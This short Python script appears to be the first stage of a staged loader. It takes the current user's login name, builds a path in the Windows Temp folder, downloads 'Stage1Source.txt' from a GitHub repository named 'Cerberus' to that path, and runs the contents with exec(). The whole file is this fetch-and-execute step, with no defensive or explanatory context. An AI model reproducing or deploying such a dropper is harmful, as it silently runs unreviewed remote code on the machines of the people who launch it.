import os.path
import urllib.request
from bs4 import BeautifulSoup

x = os.getlogin()

path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1.py")


if os.path.isfile(path) == False:
    file = open('Stage1.py', 'a')
    file.close()

urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage1Source.txt", path)

exec(open(path).read())
